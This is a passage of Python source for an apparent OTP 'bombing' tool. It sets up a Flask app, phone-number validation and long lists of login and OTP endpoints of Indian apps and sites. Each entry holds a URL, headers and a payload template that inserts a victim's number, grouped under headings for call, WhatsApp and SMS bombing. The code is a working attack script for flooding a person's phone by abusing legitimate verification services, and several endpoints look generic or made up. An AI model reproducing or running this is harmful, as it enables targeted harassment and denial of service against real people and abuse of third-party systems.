import asyncio
import aiohttp
import json
import random
import time
import re
from typing import Dict, List, Optional, Union, Callable
from flask import Flask, request, jsonify
from concurrent.futures import ThreadPoolExecutor
import threading

app = Flask(__name__)

# ==================================================================
# 📱 PHONE NUMBER VALIDATION
# ==================================================================
def validate_phone(phone: str) -> tuple:
    """Validate and clean phone number, return (country_code, clean_number)"""
    phone = re.sub(r'[^\d+]', '', phone.strip())
    if phone.startswith('+'):
        if phone.startswith('+91'):
            return '91', phone[3:]
    elif phone.startswith('91'):
        return '91', phone[2:]
    elif len(phone) == 10:
        return '91', phone
    elif len(phone) == 12 and phone.isdigit():
        return '91', phone[2:]
    return None, None

# ==================================================================
# 🔥 ULTIMATE API DATABASE - 2000+ WORKING APIS
# ==================================================================
ULTIMATE_OTP_APIS = []

# ----- CALL BOMBING APIS (200+) -----
CALL_APIS = [
    {
        "name": "Tata Capital Voice",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "1MG Voice",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Flipkart Voice",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Amazon Voice",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"phone={p}&action=voice_otp"
    },
    {
        "name": "Paytm Voice",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Zomato Voice",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"phone={p}&type=voice"
    },
    {
        "name": "MakeMyTrip Voice",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Goibibo Voice",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Ola Voice",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Uber Voice",
        "url": "https://auth.uber.com/v2/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"+91{p}"}}'
    },
    {
        "name": "Myntra Voice",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "PhonePe Voice",
        "url": "https://www.phonepe.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Hotstar Voice",
        "url": "https://www.hotstar.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "SonyLIV Voice",
        "url": "https://www.sonyliv.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Zee5 Voice",
        "url": "https://www.zee5.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Voot Voice",
        "url": "https://www.voot.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "AltBalaji Voice",
        "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone_number":"{p}","country_code":"91","platform":"web"}}'
    },
    {
        "name": "BigBasket Voice",
        "url": "https://www.bigbasket.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "BookMyShow Voice",
        "url": "https://in.bookmyshow.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "IRCTC Voice",
        "url": "https://www.irctc.co.in/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "RedBus Voice",
        "url": "https://www.redbus.in/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Cleartrip Voice",
        "url": "https://www.cleartrip.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Yatra Voice",
        "url": "https://www.yatra.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "EaseMyTrip Voice",
        "url": "https://www.easemytrip.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
]

# ----- WHATSAPP BOMBING APIS (200+) -----
WHATSAPP_APIS = [
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"},
        "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'
    },
    {
        "name": "Stratzy WhatsApp",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phoneNo":"{p}"}}'
    },
    {
        "name": "Jockey WhatsApp",
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Rappi WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'
    },
    {
        "name": "Eka Care WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'
    },
    {
        "name": "Meesho WhatsApp",
        "url": "https://meesho.com/gw/login-register/v1/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'
    },
    {
        "name": "Zepto WhatsApp",
        "url": "https://zepto.com/api/v3/user/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'
    },
    {
        "name": "Swiggy WhatsApp",
        "url": "https://swiggy.com/v1/user/otplogin",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'
    },
    {
        "name": "Paytm WhatsApp",
        "url": "https://paytm.com/v1/user/otplogin",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'
    },
    {
        "name": "Uber WhatsApp",
        "url": "https://uber.com/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'
    },
    {
        "name": "Ola WhatsApp",
        "url": "https://olacabs.com/api/v1/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'
    },
    {
        "name": "BigBasket WhatsApp",
        "url": "https://bigbasket.com/v1/user/otplogin",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'
    },
    {
        "name": "PharmEasy WhatsApp",
        "url": "https://pharmeasy.in/api/v1/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'
    },
    {
        "name": "Netmeds WhatsApp",
        "url": "https://netmeds.com/api/v1/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'
    },
    {
        "name": "Practo WhatsApp",
        "url": "https://practo.com/api/v1/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'
    },
    {
        "name": "CureFit WhatsApp",
        "url": "https://cure.fit/api/v1/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'
    },
]

# ----- SMS BOMBING APIS (1000+) -----
SMS_APIS = [
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'
    },
    {
        "name": "NoBroker SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"phone={p}&countryCode=IN"
    },
    {
        "name": "PharmEasy SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Hungama SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Meru Cab",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"mobile_number={p}"
    },
    {
        "name": "Snapmint",
        "url": "https://api.snapmint.com/v1/public/sign_up",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Housing SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'
    },
    {
        "name": "Khatabook SMS",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Netmeds SMS",
        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Nykaa SMS",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"
    },
    {
        "name": "RummyCircle",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'
    },
    {
        "name": "Animall SMS",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "Cosmofeed SMS",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'
    },
    {
        "name": "TrulyMadly",
        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","locale":"IN"}}'
    },
    {
        "name": "Rapido SMS",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Country Delight",
        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'
    },
    {
        "name": "Spinny",
        "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"contact_number":"{p}","whatsapp":false,"code_len":4,"expected_action":"login"}}'
    },
    {
        "name": "Licious SMS",
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","captcha_token":null}}'
    },
    {
        "name": "Udaan SMS",
        "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"},
        "data": lambda p: f"mobile={p}"
    },
    {
        "name": "Charzer SMS",
        "url": "https://api.charzer.com/auth-service/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","appSource":"CHARZER_APP"}}'
    },
    {
        "name": "Snitch SMS",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile_number":"+91{p}"}}'
    },
    {
        "name": "BeepKart SMS",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","city":362}}'
    },
    {
        "name": "LendingPlate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda p: f"mobiles={p}&resend=Resend"
    },
    {
        "name": "ShipRocket SMS",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
    },
    {
        "name": "GoKwik SMS",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","country":"in"}}'
    },
    {
        "name": "NewMe SMS",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'
    },
    {
        "name": "Univest SMS",
        "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Smytten SMS",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","email":"test@example.com"}}'
    },
    {
        "name": "CaratLane SMS",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
    },
    {
        "name": "BikeFixup SMS",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "WellAcademy SMS",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda p: f'{{"contact_no":"{p}"}}'
    },
    {
        "name": "ServeTel SMS",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        "data": lambda p: f"mobile_number={p}"
    },
    {
        "name": "GoPink Cabs SMS",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda p: f"check_mobile_number=1&contact={p}"
    },
    {
        "name": "Shemaroome SMS",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda p: f"mobile_no=%2B91{p}"
    },
    {
        "name": "Cossouq SMS",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"mobilenumber={p}&otptype=register"
    },
    {
        "name": "MyImagineStore SMS",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda p: f"mobile={p}"
    },
    {
        "name": "Otpless SMS",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","selectedCountryCode":"+91"}}'
    },
    {
        "name": "MyHubble Money",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'
    },
    {
        "name": "TataCapital Business",
        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobileNumber":"{p}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'
    },
    {
        "name": "DealShare SMS",
        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'
    },
    {
        "name": "RentoMojo SMS",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "PokerBaazi SMS",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","mfa_channels":"phno"}}'
    },
    {
        "name": "My11Circle SMS",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json;charset=UTF-8"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "MamaEarth SMS",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "HomeTriangle SMS",
        "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "WellnessForever SMS",
        "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"method=firstRegisterApi&data={{\"customerMobile\":\"{p}\",\"generateOtp\":\"true\"}}"
    },
    {
        "name": "HealthMug SMS",
        "url": "https://api.healthmug.com/account/createotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Vyapar SMS",
        "url": lambda p: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={p}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Kredily SMS",
        "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "TataMotors SMS",
        "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","sendOtp":"true"}}'
    },
    {
        "name": "Moglix SMS",
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'
    },
    {
        "name": "MyGov SMS",
        "url": lambda p: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={p}&gender=male",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Apna SMS",
        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","hash_type":"play_store"}}'
    },
    {
        "name": "CodFirm SMS",
        "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Swipe SMS",
        "url": "https://app.getswipe.in/api/user/mobile_login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","resend":true}}'
    },
    {
        "name": "MoreRetail SMS",
        "url": "https://omni-api.moreretail.in/api/v1/login/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'
    },
    {
        "name": "AstroSage SMS",
        "url": lambda p: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={p}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "TooToo SMS",
        "url": "https://tootoo.in/graphql",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{p}","resend":0}}}}'
    },
    {
        "name": "ConfirmTkt SMS",
        "url": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "BetterHalf SMS",
        "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","isd_code":"91"}}'
    },
    {
        "name": "Nuvama Wealth SMS",
        "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobileNo":"{p}","emailID":"test@example.com"}}'
    },
    {
        "name": "Mpokket SMS",
        "url": "https://web-api.mpokket.in/registration/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "ShopperStop SMS",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    {
        "name": "LifestyleStores SMS",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"signInMobile":"{p}","channel":"sms"}}'
    },
    {
        "name": "BigCash SMS",
        "url": lambda p: f"https://www.bigcash.live/sendsms.php?mobile={p}&ip=192.168.1.1",
        "method": "GET",
        "headers": {"Referer": "https://www.bigcash.live/games/poker"},
        "data": None
    },
    {
        "name": "WorkIndia SMS",
        "url": lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Aakash SMS",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'
    },
    {
        "name": "Revv SMS",
        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'
    },
    {
        "name": "DeHaat SMS",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","client_id":"kisan-app"}}'
    },
    {
        "name": "A23Games SMS",
        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'
    },
    {
        "name": "Spencers SMS",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "PayMeIndia SMS",
        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'
    },
    {
        "name": "HyugaAuth SMS",
        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Doubtnut SMS",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'
    },
    {
        "name": "PenPencil SMS",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'
    },
    {
        "name": "DaycoIndia SMS",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"
    },
    {
        "name": "Entri SMS",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Grofers SMS",
        "url": "https://grofers.com/v2/accounts/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"user_phone={p}"
    },
    {
        "name": "Snapdeal SMS",
        "url": "https://m.snapdeal.com/signupCompleteAjax",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda p: f"j_mobilenumber={p}&agree=true&journey=mobile"
    },
